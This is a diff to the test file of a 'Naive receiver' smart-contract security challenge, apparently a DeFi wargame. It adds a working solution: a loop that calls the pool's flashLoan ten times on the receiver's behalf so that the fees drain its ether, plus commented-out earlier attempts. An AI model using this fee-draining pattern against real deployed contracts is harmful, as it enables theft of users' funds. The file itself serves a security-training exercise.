@@ -31,6 +31,26 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+//	this.receiver.receiveEther(ethers.utils.parseEther('9',{value: ethers.utils.parseEther('1'), sender: this.pool.address}));
+
+/*     one solution is here! 
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('2'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('3'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('4'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('5'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('6'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('7'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('8'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('9'));
+       this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('9'));
+*/
+	   for (let i = 0; i < 10; i++){
+		await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+
+		//await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'), {from: attacker.address});
+	   }
+
     });
 
     after(async function () {
